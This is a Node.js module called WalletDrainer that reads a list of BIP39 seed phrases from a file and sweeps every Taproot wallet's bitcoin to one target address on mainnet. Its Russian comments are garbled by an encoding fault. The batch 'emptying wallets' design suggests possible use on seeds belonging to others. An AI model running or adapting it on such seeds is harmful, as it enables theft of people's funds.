const bitcoin = require('bitcoinjs-lib');
const { BIP32Factory } = require('bip32');
const ecc = require('tiny-secp256k1');
const bip39 = require('bip39');
const fs = require('fs');

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è BIP32
const bip32 = BIP32Factory(ecc);
bitcoin.initEccLib(ecc);

// –ü—Ä–æ—Å—Ç–∞—è –∑–∞–º–µ–Ω–∞ fetch –¥–ª—è Node.js
async function fetch(url, options = {}) {
    const https = require('https');
    const http = require('http');
    const { URL } = require('url');
    
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const client = parsedUrl.protocol === 'https:' ? https : http;
        
        const requestOptions = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port,
            path: parsedUrl.pathname + parsedUrl.search,
            method: options.method || 'GET',
            headers: options.headers || {}
        };

        const req = client.request(requestOptions, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                resolve({
                    ok: res.statusCode >= 200 && res.statusCode < 300,
                    status: res.statusCode,
                    json: () => Promise.resolve(JSON.parse(data)),
                    text: () => Promise.resolve(data)
                });
            });
        });

        req.on('error', reject);
        
        if (options.body) {
            req.write(options.body);
        }
        
        req.end();
    });
}

class WalletDrainer {
    constructor() {
        this.network = bitcoin.networks.bitcoin; // mainnet
        this.feeRates = {
            slow: 1,      // ~60+ –º–∏–Ω—É—Ç
            normal: 10,   // ~30 –º–∏–Ω—É—Ç  
            fast: 20,     // ~10 –º–∏–Ω—É—Ç
            fastest: 50   // ~1-3 –º–∏–Ω—É—Ç—ã
        };
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ UTXO –¥–ª—è –∞–¥—Ä–µ—Å–∞
    async getUTXOs(address) {
        const apis = [
            `https://blockstream.info/api/address/${address}/utxo`,
            `https://api.blockcypher.com/v1/btc/main/addrs/${address}?unspentOnly=true`
        ];

        for (const apiUrl of apis) {
            try {
                console.log(`  üì° –ó–∞–ø—Ä–æ—Å UTXO: ${apiUrl.includes('blockstream') ? 'Blockstream.info' : 'BlockCypher'}`);
                
                const response = await fetch(apiUrl);
                if (!response.ok) continue;
                
                const data = await response.json();
                
                if (apiUrl.includes('blockstream')) {
                    return data; // Blockstream –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –º–∞—Å—Å–∏–≤ UTXO –Ω–∞–ø—Ä—è–º—É—é
                } else {
                    // BlockCypher format
                    return data.txrefs ? data.txrefs.map(utxo => ({
                        txid: utxo.tx_hash,
                        vout: utxo.tx_output_n,
                        value: utxo.value
                    })) : [];
                }
            } catch (error) {
                console.log(`  ‚ùå –û—à–∏–±–∫–∞ API: ${error.message}`);
                continue;
            }
        }
        
        throw new Error('–í—Å–µ API –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã');
    }

    // –†–µ–∫–æ–º–µ–Ω–¥—É–µ–º–∞—è –∫–æ–º–∏—Å—Å–∏—è —Å blockstream.info
    async getRecommendedFees() {
        try {
            const response = await fetch('https://blockstream.info/api/fee-estimates');
            const fees = await response.json();
            
            return {
                slow: Math.ceil(fees['144'] || 1),      // 144 –±–ª–æ–∫–∞ (~24 —á–∞—Å–∞)
                normal: Math.ceil(fees['6'] || 10),     // 6 –±–ª–æ–∫–æ–≤ (~1 —á–∞—Å)
                fast: Math.ceil(fees['3'] || 20),       // 3 –±–ª–æ–∫–∞ (~30 –º–∏–Ω)
                fastest: Math.ceil(fees['1'] || 50)     // 1 –±–ª–æ–∫ (~10 –º–∏–Ω)
            };
        } catch (error) {
            console.log('  ‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∞–∫—Ç—É–∞–ª—å–Ω—ã–µ –∫–æ–º–∏—Å—Å–∏–∏, –∏—Å–ø–æ–ª—å–∑—É–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ');
            return this.feeRates;
        }
    }

    // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∞–¥—Ä–µ—Å–∞ –∏ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ –∏–∑ seed —Ñ—Ä–∞–∑—ã
    generateTaprootFromSeed(seedPhrase) {
        try {
            // –í–∞–ª–∏–¥–∞—Ü–∏—è seed —Ñ—Ä–∞–∑—ã
            if (!bip39.validateMnemonic(seedPhrase.trim())) {
                throw new Error('–ù–µ–≤–µ—Ä–Ω–∞—è seed —Ñ—Ä–∞–∑–∞');
            }

            // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è seed –∏–∑ –º–Ω–µ–º–æ–Ω–∏–∫–∏
            const seed = bip39.mnemonicToSeedSync(seedPhrase.trim());
            
            // –°–æ–∑–¥–∞–Ω–∏–µ root –∫–ª—é—á–∞
            const root = bip32.fromSeed(seed, this.network);
            
            // BIP86 derivation path –¥–ª—è Taproot: m/86'/0'/0'/0/0
            const child = root.derivePath("m/86'/0'/0'/0/0");
            
            // –î–ª—è P2TR –∏—Å–ø–æ–ª—å–∑—É–µ–º —Ç–æ–ª—å–∫–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á (–±–µ–∑ –ø—Ä–µ—Ñ–∏–∫—Å–∞)
            const internalPubkey = child.publicKey.slice(1, 33);
            
            // –°–æ–∑–¥–∞–Ω–∏–µ Taproot –∞–¥—Ä–µ—Å–∞ (P2TR) 
            const { address, output } = bitcoin.payments.p2tr({
                internalPubkey: internalPubkey,
                network: this.network,
            });

            // –°–æ–∑–¥–∞–µ–º tweaked private key –¥–ª—è –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è P2TR —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π
            const tweakedChildNode = child.tweak(
                bitcoin.crypto.taggedHash('TapTweak', internalPubkey)
            );
            
            return {
                address,
                privateKey: child.privateKey,
                tweakedPrivateKey: tweakedChildNode.privateKey,
                publicKey: child.publicKey,
                internalPubkey,
                output,
                childNode: child,
                tweakedChildNode: tweakedChildNode
            };
        } catch (error) {
            throw new Error(`–û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∞–¥—Ä–µ—Å–∞: ${error.message}`);
        }
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
    async createAndBroadcastTransaction(fromSeed, toAddress, feeRate) {
        console.log(`\nüîÑ –û–±—Ä–∞–±–æ—Ç–∫–∞ seed —Ñ—Ä–∞–∑—ã...`);
        
        try {
            // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∫–æ—à–µ–ª–µ–∫ –∏–∑ seed —Ñ—Ä–∞–∑—ã
            const wallet = this.generateTaprootFromSeed(fromSeed);
            console.log(`  üìç –ê–¥—Ä–µ—Å –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è: ${wallet.address}`);
            
            // –ü–æ–ª—É—á–∞–µ–º UTXO
            const utxos = await this.getUTXOs(wallet.address);
            if (!utxos || utxos.length === 0) {
                console.log(`  ‚ö†Ô∏è UTXO –Ω–µ –Ω–∞–π–¥–µ–Ω—ã, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º`);
                return null;
            }

            // –í—ã—á–∏—Å–ª—è–µ–º –æ–±—â–∏–π –±–∞–ª–∞–Ω—Å
            const totalBalance = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
            console.log(`  üí∞ –ù–∞–π–¥–µ–Ω–æ ${utxos.length} UTXO, –æ–±—â–∏–π –±–∞–ª–∞–Ω—Å: ${totalBalance} satoshi (${(totalBalance / 100000000).toFixed(8)} BTC)`);

            // –û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è UTXO - –∏—Å–ø–æ–ª—å–∑—É–µ–º –Ω–∞–∏–±–æ–ª—å—à–∏–µ UTXO –¥–ª—è –º–∏–Ω–∏–º–∏–∑–∞—Ü–∏–∏ —Ä–∞–∑–º–µ—Ä–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
            const sortedUtxos = utxos.sort((a, b) => b.value - a.value);
            
            // –°–æ–∑–¥–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            const psbt = new bitcoin.Psbt({ network: this.network });
            
            let inputValue = 0;
            let inputCount = 0;
            
            // –î–æ–±–∞–≤–ª—è–µ–º UTXO –∫–∞–∫ –≤—Ö–æ–¥—ã (—É–ø—Ä–æ—â–µ–Ω–Ω—ã–π –ø–æ–¥—Ö–æ–¥ –¥–ª—è P2TR)
            for (const utxo of sortedUtxos) {
                // –î–ª—è P2TR —Å–æ–∑–¥–∞–µ–º witnessUtxo —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º script
                psbt.addInput({
                    hash: utxo.txid,
                    index: utxo.vout,
                    witnessUtxo: {
                        script: wallet.output, // –ò—Å–ø–æ–ª—å–∑—É–µ–º output script –∏–∑ wallet
                        value: utxo.value,
                    },
                    tapInternalKey: wallet.internalPubkey,
                });
                
                inputValue += utxo.value;
                inputCount++;
                
                // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—Ö–æ–¥–æ–≤ –¥–ª—è —ç–∫–æ–Ω–æ–º–∏–∏ –∫–æ–º–∏—Å—Å–∏–∏
                if (inputCount >= 5) break; // –£–º–µ–Ω—å—à–∏–ª –ª–∏–º–∏—Ç –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
            }

            // –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º –ø—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
            // P2TR input ~57.5 bytes, P2TR output ~43 bytes, overhead ~10 bytes
            const estimatedSize = inputCount * 58 + 43 + 10;
            const fee = Math.ceil(estimatedSize * feeRate);
            
            const outputValue = inputValue - fee;
            
            if (outputValue <= 546) { // dust limit
                console.log(`  ‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –ø–æ–∫—Ä—ã—Ç–∏—è –∫–æ–º–∏—Å—Å–∏–∏ (${outputValue} —Åats –ø–æ—Å–ª–µ –∫–æ–º–∏—Å—Å–∏–∏ ${fee} —Åats)`);
                return null;
            }

            // –î–æ–±–∞–≤–ª—è–µ–º –≤—ã—Ö–æ–¥
            psbt.addOutput({
                address: toAddress,
                value: outputValue,
            });

            console.log(`  üîß –ü–æ–¥–ø–∏—Å–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...`);
            
            // –ü–æ–¥–ø–∏—Å—ã–≤–∞–µ–º –≤—Å–µ –≤—Ö–æ–¥—ã –∏—Å–ø–æ–ª—å–∑—É—è tweaked BIP32 node –¥–ª—è P2TR
            for (let i = 0; i < inputCount; i++) {
                try {
                    // –ò—Å–ø–æ–ª—å–∑—É–µ–º tweaked BIP32 node –¥–ª—è P2TR –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è
                    psbt.signInput(i, wallet.tweakedChildNode);
                    console.log(`    ‚úÖ –í—Ö–æ–¥ ${i + 1} –ø–æ–¥–ø–∏—Å–∞–Ω tweaked node`);
                } catch (signError) {
                    console.log(`    ‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è –≤—Ö–æ–¥–∞ ${i + 1}: ${signError.message}`);
                    // –ü–æ–ø—Ä–æ–±—É–µ–º —Å–æ–∑–¥–∞—Ç—å —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π signer –¥–ª—è Taproot
                    try {
                        console.log(`    üîÑ –ü—Ä–æ–±—É–µ–º —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π Taproot signer...`);
                        const taprootSigner = bitcoin.ECPair.fromPrivateKey(wallet.tweakedPrivateKey, {
                            network: this.network
                        });
                        psbt.signInput(i, taprootSigner);
                        console.log(`    ‚úÖ –í—Ö–æ–¥ ${i + 1} –ø–æ–¥–ø–∏—Å–∞–Ω —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–º signer`);
                    } catch (altError) {
                        console.log(`    ‚ùå –°–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π signer —Ç–æ–∂–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª: ${altError.message}`);
                        throw signError;
                    }
                }
            }

            console.log(`  üîß –§–∏–Ω–∞–ª–∏–∑–∞—Ü–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...`);
            // –§–∏–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            psbt.finalizeAllInputs();
            
            // –ü–æ–ª—É—á–∞–µ–º raw —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            const rawTx = psbt.extractTransaction().toHex();
            
            console.log(`  üìÑ –†–∞–∑–º–µ—Ä —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${rawTx.length / 2} –±–∞–π—Ç`);
            console.log(`  üí∏ –ö–æ–º–∏—Å—Å–∏—è: ${fee} satoshi (${(fee / 100000000).toFixed(8)} BTC)`);
            console.log(`  üí∞ –°—É–º–º–∞ –ø–µ—Ä–µ–≤–æ–¥–∞: ${outputValue} satoshi (${(outputValue / 100000000).toFixed(8)} BTC)`);
            
            // –í—Ä–µ–º–µ–Ω–Ω–æ –≤—ã–≤–æ–¥–∏–º hex –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
            console.log(`  üîç Raw —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è (–ø–µ—Ä–≤—ã–µ 100 —Å–∏–º–≤–æ–ª–æ–≤): ${rawTx.substring(0, 100)}...`);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            const txid = await this.broadcastTransaction(rawTx);
            
            return {
                txid,
                fromAddress: wallet.address,
                toAddress,
                amount: outputValue,
                fee,
                utxoCount: inputCount
            };
            
        } catch (error) {
            console.log(`  ‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
            console.log(`  üìã Stack trace: ${error.stack}`);
            return null;
        }
    }

    // –¢–µ—Å—Ç–æ–≤—ã–π —Ä–µ–∂–∏–º - —Å–∏–º—É–ª—è—Ü–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –±–µ–∑ –æ—Ç–ø—Ä–∞–≤–∫–∏
    async testTransactionCreation(fromSeed, toAddress, feeRate) {
        console.log(`\nüß™ –¢–ï–°–¢–û–í–´–ô –†–ï–ñ–ò–ú - —Å–∏–º—É–ª—è—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏`);
        
        try {
            const wallet = this.generateTaprootFromSeed(fromSeed);
            console.log(`  üìç –ê–¥—Ä–µ—Å –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è: ${wallet.address}`);
            
            const utxos = await this.getUTXOs(wallet.address);
            if (!utxos || utxos.length === 0) {
                console.log(`  ‚ö†Ô∏è UTXO –Ω–µ –Ω–∞–π–¥–µ–Ω—ã`);
                return null;
            }

            const totalBalance = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
            console.log(`  üí∞ –ù–∞–π–¥–µ–Ω–æ ${utxos.length} UTXO, –æ–±—â–∏–π –±–∞–ª–∞–Ω—Å: ${totalBalance} satoshi`);
            
            // –ü—Ä–æ—Å—Ç–æ–π —Ä–∞—Å—á–µ—Ç –∫–æ–º–∏—Å—Å–∏–∏
            const estimatedSize = utxos.length * 58 + 43 + 10;
            const fee = Math.ceil(estimatedSize * feeRate);
            const outputValue = totalBalance - fee;
            
            console.log(`  üìä –†–∞—Å—á–µ—Ç—ã:`);
            console.log(`    - –†–∞–∑–º–µ—Ä —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ~${estimatedSize} –±–∞–π—Ç`);
            console.log(`    - –ö–æ–º–∏—Å—Å–∏—è: ${fee} satoshi (${(fee / 100000000).toFixed(8)} BTC)`);
            console.log(`    - –ö –ø–µ—Ä–µ–≤–æ–¥—É: ${outputValue} satoshi (${(outputValue / 100000000).toFixed(8)} BTC)`);
            
            if (outputValue <= 546) {
                console.log(`  ‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –ø–æ—Å–ª–µ –∫–æ–º–∏—Å—Å–∏–∏`);
                return null;
            }
            
            console.log(`  ‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –º–æ–∂–µ—Ç –±—ã—Ç—å —Å–æ–∑–¥–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ`);
            return { success: true, amount: outputValue, fee };
            
        } catch (error) {
            console.log(`  ‚ùå –û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: ${error.message}`);
            return null;
        }
    }
    async getPreviousTransaction(txid) {
        const apis = [
            `https://blockstream.info/api/tx/${txid}`,
            `https://api.blockcypher.com/v1/btc/main/txs/${txid}`
        ];

        for (const apiUrl of apis) {
            try {
                const response = await fetch(apiUrl);
                if (!response.ok) continue;
                
                const data = await response.json();
                
                if (apiUrl.includes('blockstream')) {
                    return data;
                } else {
                    // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º —Ñ–æ—Ä–º–∞—Ç BlockCypher –≤ —Ñ–æ—Ä–º–∞—Ç Blockstream
                    return {
                        vout: data.outputs.map(output => ({
                            scriptpubkey_raw: output.script,
                            value: output.value
                        }))
                    };
                }
            } catch (error) {
                continue;
            }
        }
        
        return null;
    }

    // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤ —Å–µ—Ç—å
    async broadcastTransaction(rawTx) {
        const apis = [
            {
                url: 'https://blockstream.info/api/tx',
                method: 'POST',
                body: rawTx,
                headers: { 'Content-Type': 'text/plain' }
            },
            {
                url: 'https://api.blockcypher.com/v1/btc/main/txs/push',
                method: 'POST',
                body: JSON.stringify({ tx: rawTx }),
                headers: { 'Content-Type': 'application/json' }
            }
        ];

        for (const api of apis) {
            try {
                console.log(`  üì° –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ ${api.url.includes('blockstream') ? 'Blockstream.info' : 'BlockCypher'}`);
                
                const response = await fetch(api.url, {
                    method: api.method,
                    body: api.body,
                    headers: api.headers
                });

                if (response.ok) {
                    const result = await response.text();
                    const txid = api.url.includes('blockstream') ? result : JSON.parse(result).tx.hash;
                    console.log(`  ‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! TXID: ${txid}`);
                    return txid;
                }
            } catch (error) {
                console.log(`  ‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ${error.message}`);
                continue;
            }
        }
        
        throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é —á–µ—Ä–µ–∑ –≤—Å–µ API');
    }

    // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ–ø—É—Å—Ç–æ—à–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–æ–≤
    async drainWallets(targetAddress, feeRate = 10) {
        console.log('====================================================================================================');
        console.log('üí∏ –û–ü–£–°–¢–û–®–ï–ù–ò–ï TAPROOT –ö–û–®–ï–õ–¨–ö–û–í');
        console.log('====================================================================================================');
        console.log(`üéØ –ê–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ${targetAddress}`);
        console.log(`‚ö° –ö–æ–º–∏—Å—Å–∏—è: ${feeRate} sat/byte`);
        console.log('====================================================================================================');

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–∞–π–ª seeds.txt
        if (!fs.existsSync('seeds.txt')) {
            throw new Error('–§–∞–π–ª seeds.txt –Ω–µ –Ω–∞–π–¥–µ–Ω');
        }

        const seedsContent = fs.readFileSync('seeds.txt', 'utf8');
        const seeds = seedsContent.split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);

        if (seeds.length === 0) {
            throw new Error('–§–∞–π–ª seeds.txt –ø—É—Å—Ç');
        }

        console.log(`–ó–∞–≥—Ä—É–∂–µ–Ω–æ ${seeds.length} seed —Ñ—Ä–∞–∑ –∏–∑ —Ñ–∞–π–ª–∞\n`);

        const results = [];
        let totalDrained = 0;
        let successCount = 0;

        for (let i = 0; i < seeds.length; i++) {
            console.log(`–û–±—Ä–∞–±–æ—Ç–∫–∞ seed ${i + 1}/${seeds.length}:`);
            console.log(`Seed: ${seeds[i].substring(0, 30)}...`);
            
            try {
                const result = await this.createAndBroadcastTransaction(seeds[i], targetAddress, feeRate);
                
                if (result) {
                    results.push(result);
                    totalDrained += result.amount;
                    successCount++;
                    console.log(`  ‚úÖ –£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–æ!`);
                } else {
                    console.log(`  ‚ö†Ô∏è –ù–µ—Ç —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞`);
                }
                
                // –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏
                if (i < seeds.length - 1) {
                    console.log(`  ‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ 3 —Å–µ–∫—É–Ω–¥—ã...`);
                    await new Promise(resolve => setTimeout(resolve, 3000));
                }
                
            } catch (error) {
                console.log(`  ‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
            }
            
            console.log('');
        }

        // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
        if (results.length > 0) {
            this.saveResults(results, targetAddress, feeRate);
        }

        // –ò—Ç–æ–≥–æ–≤–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
        console.log('====================================================================================================');
        console.log('–ò–¢–û–ì–û–í–ê–Ø –°–¢–ê–¢–ò–°–¢–ò–ö–ê –û–ü–£–°–¢–û–®–ï–ù–ò–Ø');
        console.log('====================================================================================================');
        console.log(`–í—Å–µ–≥–æ seed —Ñ—Ä–∞–∑: ${seeds.length}`);
        console.log(`–£—Å–ø–µ—à–Ω—ã—Ö –ø–µ—Ä–µ–≤–æ–¥–æ–≤: ${successCount}`);
        console.log(`–û–±—â–∞—è —Å—É–º–º–∞ –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–∞: ${(totalDrained / 100000000).toFixed(8)} BTC`);
        console.log(`–ê–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ${targetAddress}`);
        console.log('====================================================================================================');

        return results;
    }

    // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
    saveResults(results, targetAddress, feeRate) {
        const timestamp = new Date().toISOString();
        const filename = `drain_results_${timestamp.replace(/:/g, '-').replace(/\./g, '-')}.json`;
        
        const report = {
            timestamp,
            targetAddress,
            feeRate,
            totalTransactions: results.length,
            totalAmountDrained: results.reduce((sum, r) => sum + r.amount, 0),
            totalFeesPaid: results.reduce((sum, r) => sum + r.fee, 0),
            transactions: results
        };

        fs.writeFileSync(filename, JSON.stringify(report, null, 2));
        console.log(`üíæ –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ —Ñ–∞–π–ª: ${filename}`);
    }

    // –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π –≤—ã–±–æ—Ä –∫–æ–º–∏—Å—Å–∏–∏
    async selectFeeRate() {
        const readline = require('readline');
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        console.log('\n‚ö° –í–´–ë–û–† –ö–û–ú–ò–°–°–ò–ò –¢–†–ê–ù–ó–ê–ö–¶–ò–ò:');
        
        // –ü–æ–ª—É—á–∞–µ–º –∞–∫—Ç—É–∞–ª—å–Ω—ã–µ –∫–æ–º–∏—Å—Å–∏–∏
        const fees = await this.getRecommendedFees();
        
        console.log('1. üêå –ú–µ–¥–ª–µ–Ω–Ω–æ  :', `${fees.slow} sat/byte (–Ω–µ—Å–∫–æ–ª—å–∫–æ —á–∞—Å–æ–≤)`);
        console.log('2. üö∂ –û–±—ã—á–Ω–æ    :', `${fees.normal} sat/byte (~1 —á–∞—Å)`);
        console.log('3. üèÉ –ë—ã—Å—Ç—Ä–æ    :', `${fees.fast} sat/byte (~30 –º–∏–Ω—É—Ç)`);
        console.log('4. ‚ö° –û—á–µ–Ω—å –±—ã—Å—Ç—Ä–æ:', `${fees.fastest} sat/byte (~10 –º–∏–Ω—É—Ç)`);
        console.log('5. üîß –°–≤–æ—è –∫–æ–º–∏—Å—Å–∏—è');

        return new Promise((resolve) => {
            rl.question('\n–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç (1-5): ', (answer) => {
                rl.close();
                
                switch (answer.trim()) {
                    case '1':
                        resolve(fees.slow);
                        break;
                    case '2':
                        resolve(fees.normal);
                        break;
                    case '3':
                        resolve(fees.fast);
                        break;
                    case '4':
                        resolve(fees.fastest);
                        break;
                    case '5':
                        const customRl = readline.createInterface({
                            input: process.stdin,
                            output: process.stdout
                        });
                        customRl.question('–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∏—Å—Å–∏—é (sat/byte): ', (customFee) => {
                            customRl.close();
                            const fee = parseInt(customFee);
                            resolve(isNaN(fee) ? fees.normal : fee);
                        });
                        break;
                    default:
                        console.log('–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞—è –∫–æ–º–∏—Å—Å–∏—è');
                        resolve(fees.normal);
                }
            });
        });
    }
}

module.exports = WalletDrainer;
